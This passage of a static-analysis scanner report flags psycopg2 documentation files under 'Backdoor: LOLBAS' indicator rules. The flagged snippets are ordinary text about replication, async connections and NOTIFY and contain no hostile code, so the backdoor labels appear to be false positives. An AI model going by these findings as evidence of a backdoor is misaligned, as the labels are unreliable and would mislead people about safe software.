                      "markdown": "`        to prevent disconnect via timeout. Feedback is automatically sent when\n        `read_message()` is called or during run of the `consume_stream()`.\n        To specify the feedback interval use *status_interval* parameter.\n        The value of this parameter must be set to at least 1 second, but\n        it can have a fractional part.\n\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extras.rst"
                },
                "region": {
                  "startLine": 309,
                  "startColumn": 23,
                  "endLine": 309,
                  "endColumn": 27,
                  "snippet": {
                    "text": "\n        If *start_lsn* is specified, the requested stream will start from that\n        LSN.  The default is `!None` which passes the LSN ``0/0`` causing\n        replay to begin at the last point for which the server got flush\n        confirmation from the client, or the oldest available point for a new\n        slot.\n\n",
                    "rendered": {
                      "text": "\n        If *start_lsn* is specified, the requested stream will start from that\n        LSN.  The default is `!None` which passes the LSN ``0/0`` causing\n        replay to begin at the last point for which the server got flush\n        confirmation from the client, or the oldest available point for a new\n        slot.\n\n",
                      "markdown": "`\n        If *start_lsn* is specified, the requested stream will start from that\n        LSN.  The default is `!None` which passes the LSN ``0/0`` causing\n        replay to begin at the last point for which the server got flush\n        confirmation from the client, or the oldest available point for a new\n        slot.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extras.rst"
                },
                "region": {
                  "startLine": 213,
                  "startColumn": 62,
                  "endLine": 213,
                  "endColumn": 66,
                  "snippet": {
                    "text": "\n    .. attribute:: send_time\n\n        A `~datetime` object representing the server timestamp at the moment\n        when the message was sent.\n\n    .. attribute:: cursor\n",
                    "rendered": {
                      "text": "\n    .. attribute:: send_time\n\n        A `~datetime` object representing the server timestamp at the moment\n        when the message was sent.\n\n    .. attribute:: cursor\n",
                      "markdown": "`\n    .. attribute:: send_time\n\n        A `~datetime` object representing the server timestamp at the moment\n        when the message was sent.\n\n    .. attribute:: cursor\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extras.rst"
                },
                "region": {
                  "startLine": 540,
                  "startColumn": 37,
                  "endLine": 540,
                  "endColumn": 46,
                  "snippet": {
                    "text": "              try:\n                  sel = select([cur], [], [], max(0, timeout))\n              except InterruptedError:\n                  pass  # recalculate timeout and continue\n\n.. index::\n    pair: Cursor; Replication\n",
                    "rendered": {
                      "text": "              try:\n                  sel = select([cur], [], [], max(0, timeout))\n              except InterruptedError:\n                  pass  # recalculate timeout and continue\n\n.. index::\n    pair: Cursor; Replication\n",
                      "markdown": "`              try:\n                  sel = select([cur], [], [], max(0, timeout))\n              except InterruptedError:\n                  pass  # recalculate timeout and continue\n\n.. index::\n    pair: Cursor; Replication\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extras.rst"
                },
                "region": {
                  "startLine": 536,
                  "startColumn": 13,
                  "endLine": 536,
                  "endColumn": 22,
                  "snippet": {
                    "text": "              consume(msg)\n          else:\n              now = datetime.now()\n              timeout = status_interval - (now - cur.feedback_timestamp).total_seconds()\n              try:\n                  sel = select([cur], [], [], max(0, timeout))\n              except InterruptedError:\n",
                    "rendered": {
                      "text": "              consume(msg)\n          else:\n              now = datetime.now()\n              timeout = status_interval - (now - cur.feedback_timestamp).total_seconds()\n              try:\n                  sel = select([cur], [], [], max(0, timeout))\n              except InterruptedError:\n",
                      "markdown": "`              consume(msg)\n          else:\n              now = datetime.now()\n              timeout = status_interval - (now - cur.feedback_timestamp).total_seconds()\n              try:\n                  sel = select([cur], [], [], max(0, timeout))\n              except InterruptedError:\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extras.rst"
                },
                "region": {
                  "startLine": 488,
                  "startColumn": 25,
                  "endLine": 488,
                  "endColumn": 34,
                  "snippet": {
                    "text": "        from the server.\n\n        Last, but not least, this method sends feedback messages when\n        *status_interval* timeout is reached or when keepalive message with\n        reply request arrived from the server.\n\n    .. method:: fileno()\n",
                    "rendered": {
                      "text": "        from the server.\n\n        Last, but not least, this method sends feedback messages when\n        *status_interval* timeout is reached or when keepalive message with\n        reply request arrived from the server.\n\n    .. method:: fileno()\n",
                      "markdown": "`        from the server.\n\n        Last, but not least, this method sends feedback messages when\n        *status_interval* timeout is reached or when keepalive message with\n        reply request arrived from the server.\n\n    .. method:: fileno()\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extras.rst"
                },
                "region": {
                  "startLine": 448,
                  "startColumn": 30,
                  "endLine": 448,
                  "endColumn": 39,
                  "snippet": {
                    "text": "        If the *reply* or *force* parameters are not set, this method will\n        just update internal structures without sending the feedback message\n        to the server. The library sends feedback message automatically\n        when *status_interval* timeout is reached. For this to work, you must\n        call `send_feedback()` on the same Cursor that you called `start_replication()`\n        on (the one in `message.cursor`) or your feedback will be lost.\n\n",
                    "rendered": {
                      "text": "        If the *reply* or *force* parameters are not set, this method will\n        just update internal structures without sending the feedback message\n        to the server. The library sends feedback message automatically\n        when *status_interval* timeout is reached. For this to work, you must\n        call `send_feedback()` on the same Cursor that you called `start_replication()`\n        on (the one in `message.cursor`) or your feedback will be lost.\n\n",
                      "markdown": "`        If the *reply* or *force* parameters are not set, this method will\n        just update internal structures without sending the feedback message\n        to the server. The library sends feedback message automatically\n        when *status_interval* timeout is reached. For this to work, you must\n        call `send_feedback()` on the same Cursor that you called `start_replication()`\n        on (the one in `message.cursor`) or your feedback will be lost.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extras.rst"
                },
                "region": {
                  "startLine": 439,
                  "startColumn": 84,
                  "endLine": 440,
                  "snippet": {
                    "text": "                          has applied the changes (physical replication\n                          master-slave protocol only)\n        :param reply: request the server to send back a keepalive message immediately\n        :param force: force sending a feedback message regardless of status_interval timeout\n\n        Use this method to report to the server that all messages up to a\n        certain LSN position have been processed on the client and may be\n        discarded on the server.\n",
                    "rendered": {
                      "text": "                          has applied the changes (physical replication\n                          master-slave protocol only)\n        :param reply: request the server to send back a keepalive message immediately\n        :param force: force sending a feedback message regardless of status_interval timeout\n\n        Use this method to report to the server that all messages up to a\n        certain LSN position have been processed on the client and may be\n        discarded on the server.\n",
                      "markdown": "`                          has applied the changes (physical replication\n                          master-slave protocol only)\n        :param reply: request the server to send back a keepalive message immediately\n        :param force: force sending a feedback message regardless of status_interval timeout\n\n        Use this method to report to the server that all messages up to a\n        certain LSN position have been processed on the client and may be\n        discarded on the server.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extras.rst"
                },
                "region": {
                  "startLine": 363,
                  "startColumn": 31,
                  "endLine": 363,
                  "endColumn": 37,
                  "snippet": {
                    "text": "            `~psycopg2.sql.Composable` instance for dynamic generation.\n        :param decode: a flag indicating that unicode conversion should be\n            performed on messages received from the server.\n        :param status_interval: time between feedback packets sent to the server\n\n        .. versionchanged:: 2.8.3\n            added the *status_interval* parameter.\n",
                    "rendered": {
                      "text": "            `~psycopg2.sql.Composable` instance for dynamic generation.\n        :param decode: a flag indicating that unicode conversion should be\n            performed on messages received from the server.\n        :param status_interval: time between feedback packets sent to the server\n\n        .. versionchanged:: 2.8.3\n            added the *status_interval* parameter.\n",
                      "markdown": "`            `~psycopg2.sql.Composable` instance for dynamic generation.\n        :param decode: a flag indicating that unicode conversion should be\n            performed on messages received from the server.\n        :param status_interval: time between feedback packets sent to the server\n\n        .. versionchanged:: 2.8.3\n            added the *status_interval* parameter.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extras.rst"
                },
                "region": {
                  "startLine": 291,
                  "startColumn": 31,
                  "endLine": 291,
                  "endColumn": 37,
                  "snippet": {
                    "text": "                        slot (not allowed with physical replication)\n        :param decode: a flag indicating that unicode conversion should be\n                       performed on messages received from the server\n        :param status_interval: time between feedback packets sent to the server\n\n        If a *slot_name* is specified, the slot must exist on the server and\n        its type must match the replication type used.\n",
                    "rendered": {
                      "text": "                        slot (not allowed with physical replication)\n        :param decode: a flag indicating that unicode conversion should be\n                       performed on messages received from the server\n        :param status_interval: time between feedback packets sent to the server\n\n        If a *slot_name* is specified, the slot must exist on the server and\n        its type must match the replication type used.\n",
                      "markdown": "`                        slot (not allowed with physical replication)\n        :param decode: a flag indicating that unicode conversion should be\n                       performed on messages received from the server\n        :param status_interval: time between feedback packets sent to the server\n\n        If a *slot_name* is specified, the slot must exist on the server and\n        its type must match the replication type used.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/advanced.rst"
                },
                "region": {
                  "startLine": 458,
                  "startColumn": 11,
                  "endLine": 458,
                  "endColumn": 15,
                  "snippet": {
                    "text": ".. warning::\n    Psycopg connections are not *green thread safe* and can't be used\n    concurrently by different green threads. Trying to execute more than one\n    command at time using one cursor per thread will result in an error (or a\n    deadlock on versions before 2.4.2).\n\n    Therefore, programmers are advised to either avoid sharing connections\n",
                    "rendered": {
                      "text": ".. warning::\n    Psycopg connections are not *green thread safe* and can't be used\n    concurrently by different green threads. Trying to execute more than one\n    command at time using one cursor per thread will result in an error (or a\n    deadlock on versions before 2.4.2).\n\n    Therefore, programmers are advised to either avoid sharing connections\n",
                      "markdown": "`.. warning::\n    Psycopg connections are not *green thread safe* and can't be used\n    concurrently by different green threads. Trying to execute more than one\n    command at time using one cursor per thread will result in an error (or a\n    deadlock on versions before 2.4.2).\n\n    Therefore, programmers are advised to either avoid sharing connections\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/advanced.rst"
                },
                "region": {
                  "startLine": 401,
                  "startColumn": 8,
                  "endLine": 401,
                  "endColumn": 17,
                  "snippet": {
                    "text": "possible to change it. So a\ntransaction is not implicitly started at the first query and is not possible\nto use methods `~connection.commit()` and `~connection.rollback()`: you can\nmanually control transactions using `~cursor.execute()` to send database\ncommands such as :sql:`BEGIN`, :sql:`COMMIT` and :sql:`ROLLBACK`. Similarly\n`~connection.set_session()` can't be used but it is still possible to invoke the\n:sql:`SET` command with the proper :sql:`default_transaction_...` parameter.\n",
                    "rendered": {
                      "text": "possible to change it. So a\ntransaction is not implicitly started at the first query and is not possible\nto use methods `~connection.commit()` and `~connection.rollback()`: you can\nmanually control transactions using `~cursor.execute()` to send database\ncommands such as :sql:`BEGIN`, :sql:`COMMIT` and :sql:`ROLLBACK`. Similarly\n`~connection.set_session()` can't be used but it is still possible to invoke the\n:sql:`SET` command with the proper :sql:`default_transaction_...` parameter.\n",
                      "markdown": "`possible to change it. So a\ntransaction is not implicitly started at the first query and is not possible\nto use methods `~connection.commit()` and `~connection.rollback()`: you can\nmanually control transactions using `~cursor.execute()` to send database\ncommands such as :sql:`BEGIN`, :sql:`COMMIT` and :sql:`ROLLBACK`. Similarly\n`~connection.set_session()` can't be used but it is still possible to invoke the\n:sql:`SET` command with the proper :sql:`default_transaction_...` parameter.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/advanced.rst"
                },
                "region": {
                  "startLine": 399,
                  "startColumn": 37,
                  "endLine": 399,
                  "endColumn": 41,
                  "snippet": {
                    "text": "There are several limitations in using asynchronous connections: the\nconnection is always in `~connection.autocommit` mode and it is not\npossible to change it. So a\ntransaction is not implicitly started at the first query and is not possible\nto use methods `~connection.commit()` and `~connection.rollback()`: you can\nmanually control transactions using `~cursor.execute()` to send database\ncommands such as :sql:`BEGIN`, :sql:`COMMIT` and :sql:`ROLLBACK`. Similarly\n",
                    "rendered": {
                      "text": "There are several limitations in using asynchronous connections: the\nconnection is always in `~connection.autocommit` mode and it is not\npossible to change it. So a\ntransaction is not implicitly started at the first query and is not possible\nto use methods `~connection.commit()` and `~connection.rollback()`: you can\nmanually control transactions using `~cursor.execute()` to send database\ncommands such as :sql:`BEGIN`, :sql:`COMMIT` and :sql:`ROLLBACK`. Similarly\n",
                      "markdown": "`There are several limitations in using asynchronous connections: the\nconnection is always in `~connection.autocommit` mode and it is not\npossible to change it. So a\ntransaction is not implicitly started at the first query and is not possible\nto use methods `~connection.commit()` and `~connection.rollback()`: you can\nmanually control transactions using `~cursor.execute()` to send database\ncommands such as :sql:`BEGIN`, :sql:`COMMIT` and :sql:`ROLLBACK`. Similarly\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/advanced.rst"
                },
                "region": {
                  "startLine": 383,
                  "startColumn": 19,
                  "endLine": 383,
                  "endColumn": 23,
                  "snippet": {
                    "text": "The same loop should be also used to perform nonblocking queries: after\nsending a query via `~cursor.execute()` or `~cursor.callproc()`, call\n`!poll()` on the connection available from `cursor.connection` until it\nreturns `!POLL_OK`, at which point the query has been completely sent to the\nserver and, if it produced data, the results have been transferred to the\nclient and available using the regular cursor methods:\n\n",
                    "rendered": {
                      "text": "The same loop should be also used to perform nonblocking queries: after\nsending a query via `~cursor.execute()` or `~cursor.callproc()`, call\n`!poll()` on the connection available from `cursor.connection` until it\nreturns `!POLL_OK`, at which point the query has been completely sent to the\nserver and, if it produced data, the results have been transferred to the\nclient and available using the regular cursor methods:\n\n",
                      "markdown": "`The same loop should be also used to perform nonblocking queries: after\nsending a query via `~cursor.execute()` or `~cursor.callproc()`, call\n`!poll()` on the connection available from `cursor.connection` until it\nreturns `!POLL_OK`, at which point the query has been completely sent to the\nserver and, if it produced data, the results have been transferred to the\nclient and available using the regular cursor methods:\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/advanced.rst"
                },
                "region": {
                  "startLine": 117,
                  "startColumn": 29,
                  "endLine": 117,
                  "endColumn": 33,
                  "snippet": {
                    "text": "  viable if you are the author of the object and if the object is specifically\n  designed for the database (i.e. having Psycopg as a dependency and polluting\n  its interface with the required methods doesn't bother you). For a simple\n  example you can take a look at the source code for the\n  `psycopg2.extras.Inet` object.\n\n- If implementing the `!ISQLQuote` interface directly in the object is not an\n",
                    "rendered": {
                      "text": "  viable if you are the author of the object and if the object is specifically\n  designed for the database (i.e. having Psycopg as a dependency and polluting\n  its interface with the required methods doesn't bother you). For a simple\n  example you can take a look at the source code for the\n  `psycopg2.extras.Inet` object.\n\n- If implementing the `!ISQLQuote` interface directly in the object is not an\n",
                      "markdown": "`  viable if you are the author of the object and if the object is specifically\n  designed for the database (i.e. having Psycopg as a dependency and polluting\n  its interface with the required methods doesn't bother you). For a simple\n  example you can take a look at the source code for the\n  `psycopg2.extras.Inet` object.\n\n- If implementing the `!ISQLQuote` interface directly in the object is not an\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/advanced.rst"
                },
                "region": {
                  "startLine": 528,
                  "startColumn": 32,
                  "endLine": 528,
                  "endColumn": 37,
                  "snippet": {
                    "text": ".. versionadded:: 2.7\n\nModern PostgreSQL servers (version 9.0 and above) support replication.  The\nreplication protocol is built on top of the client-server protocol and can be\noperated using ``libpq``, as such it can be also operated by ``psycopg2``.\nThe replication protocol can be operated on both synchronous and\n:ref:`asynchronous <async-support>` connections.\n",
                    "rendered": {
                      "text": ".. versionadded:: 2.7\n\nModern PostgreSQL servers (version 9.0 and above) support replication.  The\nreplication protocol is built on top of the client-server protocol and can be\noperated using ``libpq``, as such it can be also operated by ``psycopg2``.\nThe replication protocol can be operated on both synchronous and\n:ref:`asynchronous <async-support>` connections.\n",
                      "markdown": "`.. versionadded:: 2.7\n\nModern PostgreSQL servers (version 9.0 and above) support replication.  The\nreplication protocol is built on top of the client-server protocol and can be\noperated using ``libpq``, as such it can be also operated by ``psycopg2``.\nThe replication protocol can be operated on both synchronous and\n:ref:`asynchronous <async-support>` connections.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/advanced.rst"
                },
                "region": {
                  "startLine": 458,
                  "startColumn": 14,
                  "endLine": 458,
                  "endColumn": 20,
                  "snippet": {
                    "text": ".. warning::\n    Psycopg connections are not *green thread safe* and can't be used\n    concurrently by different green threads. Trying to execute more than one\n    command at time using one cursor per thread will result in an error (or a\n    deadlock on versions before 2.4.2).\n\n    Therefore, programmers are advised to either avoid sharing connections\n",
                    "rendered": {
                      "text": ".. warning::\n    Psycopg connections are not *green thread safe* and can't be used\n    concurrently by different green threads. Trying to execute more than one\n    command at time using one cursor per thread will result in an error (or a\n    deadlock on versions before 2.4.2).\n\n    Therefore, programmers are advised to either avoid sharing connections\n",
                      "markdown": "`.. warning::\n    Psycopg connections are not *green thread safe* and can't be used\n    concurrently by different green threads. Trying to execute more than one\n    command at time using one cursor per thread will result in an error (or a\n    deadlock on versions before 2.4.2).\n\n    Therefore, programmers are advised to either avoid sharing connections\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/advanced.rst"
                },
                "region": {
                  "startLine": 306,
                  "startColumn": 3,
                  "endLine": 307,
                  "snippet": {
                    "text": "    Timeout\n    Timeout\n    Got NOTIFY: 6535 test hello\n    Timeout\n    ...\n\nNote that the payload is only available from PostgreSQL 9.0: notifications\nreceived from a previous version server will have the\n",
                    "rendered": {
                      "text": "    Timeout\n    Timeout\n    Got NOTIFY: 6535 test hello\n    Timeout\n    ...\n\nNote that the payload is only available from PostgreSQL 9.0: notifications\nreceived from a previous version server will have the\n",
                      "markdown": "`    Timeout\n    Timeout\n    Got NOTIFY: 6535 test hello\n    Timeout\n    ...\n\nNote that the payload is only available from PostgreSQL 9.0: notifications\nreceived from a previous version server will have the\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/advanced.rst"
                },
                "region": {
                  "startLine": 304,
                  "startColumn": 3,
                  "endLine": 305,
                  "snippet": {
                    "text": "\n    Waiting for notifications on channel 'test'\n    Timeout\n    Timeout\n    Got NOTIFY: 6535 test hello\n    Timeout\n    ...\n\n",
                    "rendered": {
                      "text": "\n    Waiting for notifications on channel 'test'\n    Timeout\n    Timeout\n    Got NOTIFY: 6535 test hello\n    Timeout\n    ...\n\n",
                      "markdown": "`\n    Waiting for notifications on channel 'test'\n    Timeout\n    Timeout\n    Got NOTIFY: 6535 test hello\n    Timeout\n    ...\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/advanced.rst"
                },
                "region": {
                  "startLine": 303,
                  "startColumn": 3,
                  "endLine": 304,
                  "snippet": {
                    "text": ".. code-block:: none\n\n    Waiting for notifications on channel 'test'\n    Timeout\n    Timeout\n    Got NOTIFY: 6535 test hello\n    Timeout\n    ...\n",
                    "rendered": {
                      "text": ".. code-block:: none\n\n    Waiting for notifications on channel 'test'\n    Timeout\n    Timeout\n    Got NOTIFY: 6535 test hello\n    Timeout\n    ...\n",
                      "markdown": "`.. code-block:: none\n\n    Waiting for notifications on channel 'test'\n    Timeout\n    Timeout\n    Got NOTIFY: 6535 test hello\n    Timeout\n    ...\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/advanced.rst"
                },
                "region": {
                  "startLine": 297,
                  "startColumn": 11,
                  "endLine": 297,
                  "endColumn": 19,
                  "snippet": {
                    "text": "                notify = conn.notifies.pop(0)\n                print(\"Got NOTIFY:\", notify.pid, notify.channel, notify.payload)\n\nRunning the script and executing a command such as :sql:`NOTIFY test, 'hello'`\nin a separate :program:`psql` shell, the output may look similar to:\n\n.. code-block:: none\n",
                    "rendered": {
                      "text": "                notify = conn.notifies.pop(0)\n                print(\"Got NOTIFY:\", notify.pid, notify.channel, notify.payload)\n\nRunning the script and executing a command such as :sql:`NOTIFY test, 'hello'`\nin a separate :program:`psql` shell, the output may look similar to:\n\n.. code-block:: none\n",
                      "markdown": "`                notify = conn.notifies.pop(0)\n                print(\"Got NOTIFY:\", notify.pid, notify.channel, notify.payload)\n\nRunning the script and executing a command such as :sql:`NOTIFY test, 'hello'`\nin a separate :program:`psql` shell, the output may look similar to:\n\n.. code-block:: none\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/advanced.rst"
                },
                "region": {
                  "startLine": 271,
                  "startColumn": 59,
                  "endLine": 271,
                  "endColumn": 65,
                  "snippet": {
                    "text": "`~connection.poll()` method can be used to check for new messages without\nwasting resources.\n\nA simple application could poll the connection from time to time to check if\nsomething new has arrived. A better strategy is to use some I/O completion\nfunction such as :py:func:`~select.select` to sleep until awakened by the kernel when there is\nsome data to read on the connection, thereby using no CPU unless there is\n",
                    "rendered": {
                      "text": "`~connection.poll()` method can be used to check for new messages without\nwasting resources.\n\nA simple application could poll the connection from time to time to check if\nsomething new has arrived. A better strategy is to use some I/O completion\nfunction such as :py:func:`~select.select` to sleep until awakened by the kernel when there is\nsome data to read on the connection, thereby using no CPU unless there is\n",
                      "markdown": "``~connection.poll()` method can be used to check for new messages without\nwasting resources.\n\nA simple application could poll the connection from time to time to check if\nsomething new has arrived. A better strategy is to use some I/O completion\nfunction such as :py:func:`~select.select` to sleep until awakened by the kernel when there is\nsome data to read on the connection, thereby using no CPU unless there is\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/advanced.rst"
                },
                "region": {
                  "startLine": 271,
                  "startColumn": 51,
                  "endLine": 271,
                  "endColumn": 57,
                  "snippet": {
                    "text": "`~connection.poll()` method can be used to check for new messages without\nwasting resources.\n\nA simple application could poll the connection from time to time to check if\nsomething new has arrived. A better strategy is to use some I/O completion\nfunction such as :py:func:`~select.select` to sleep until awakened by the kernel when there is\nsome data to read on the connection, thereby using no CPU unless there is\n",
                    "rendered": {
                      "text": "`~connection.poll()` method can be used to check for new messages without\nwasting resources.\n\nA simple application could poll the connection from time to time to check if\nsomething new has arrived. A better strategy is to use some I/O completion\nfunction such as :py:func:`~select.select` to sleep until awakened by the kernel when there is\nsome data to read on the connection, thereby using no CPU unless there is\n",
